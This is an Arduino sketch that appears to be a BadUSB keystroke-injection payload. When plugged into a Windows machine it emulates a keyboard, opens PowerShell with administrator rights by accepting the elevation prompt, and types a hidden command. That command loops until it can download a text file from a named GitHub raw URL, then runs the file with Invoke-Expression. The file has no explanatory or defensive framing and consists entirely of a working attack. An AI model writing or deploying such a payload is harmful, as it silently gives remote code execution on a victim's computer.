#include <Keyboard.h>

void setup()
{
    Keyboard.begin();
    delay(2000);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.write(' ');
    delay(500);
    Keyboard.write('2');
    Keyboard.release(KEY_LEFT_GUI);
    delay(100);


    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.write('q');
    delay(100);
    Keyboard.release(KEY_LEFT_GUI);
    delay(100);
    Keyboard.print("PowerShell");
    delay(400);

    // CTRL + SHIFT + ENTER 
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(100);
    Keyboard.write(KEY_RETURN);
    Keyboard.release(KEY_LEFT_CTRL);
    Keyboard.release(KEY_LEFT_SHIFT);
    delay(1000);


    Keyboard.write(KEY_LEFT_ARROW);
    Keyboard.write(KEY_RETURN);
    delay(1500);


    Keyboard.print("Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command while($true){try{Test-Connection github.com -Count 1 -ErrorAction Stop;Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/Desezutt/pupupu/main/n.txt -UseBasicParsing | Select-Object -ExpandProperty Content);break}catch{Start-Sleep -Seconds 10}}';exit");

    Keyboard.write(KEY_RETURN); 
}

void loop()
{

}